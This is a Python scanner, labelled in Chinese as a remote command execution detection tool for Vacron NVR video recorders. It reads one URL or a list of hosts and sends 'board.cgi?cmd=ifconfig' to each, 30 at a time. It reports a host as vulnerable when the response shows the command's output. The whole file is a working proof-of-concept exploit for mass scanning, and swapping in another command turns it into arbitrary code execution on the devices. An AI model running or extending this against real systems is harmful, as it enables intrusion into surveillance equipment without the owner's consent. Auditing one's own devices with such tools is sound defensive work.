import random
from multiprocessing.dummy import Pool
import requests, argparse

ASCII_ART = [
    r"""
    /\_/\  
   ( o.o ) 
    > ^ <
    """,
    r"""
    /\/\/\
   ( •_•) 
   / >   \ 
    """
]
def main():
    print("\n" + random.choice(ASCII_ART) + "\n")
    parse = argparse.ArgumentParser(description="Vacron NVR-远程命令执行检测工具")
    parse.add_argument("-u", dest="url", type=str, help="URL")
    parse.add_argument("-f", dest="file", type=str, help="FILE")
    args = parse.parse_args()

    urls = []
    if args.url:
        if 'http://' in args.url:
            urls.append(args.url)
        else:
            urls.append(f"http://{args.url}")
    elif args.file:
        try:
            with open(args.file, 'r+') as f:
                for domain in f:
                    domain = domain.strip()
                    if 'http://' in domain:
                        urls.append(domain)
                    else:
                        urls.append(f"http://{domain}")
        except FileNotFoundError as e:
            print(e)

    pool = Pool(30)
    pool.map(check, urls)


def check(domain):
    url = f"{domain}/board.cgi?cmd=ifconfig"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
    }
    try:
        response = requests.get(url=url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "/sbin/ifconfig" in response.text:
            print(f"[*]存在漏洞：{domain}")
        else:
            print(f"[-]不存在漏洞{domain}")
    except Exception as e:
        print(f"错误地址{domain}")

if __name__ == '__main__':
    main()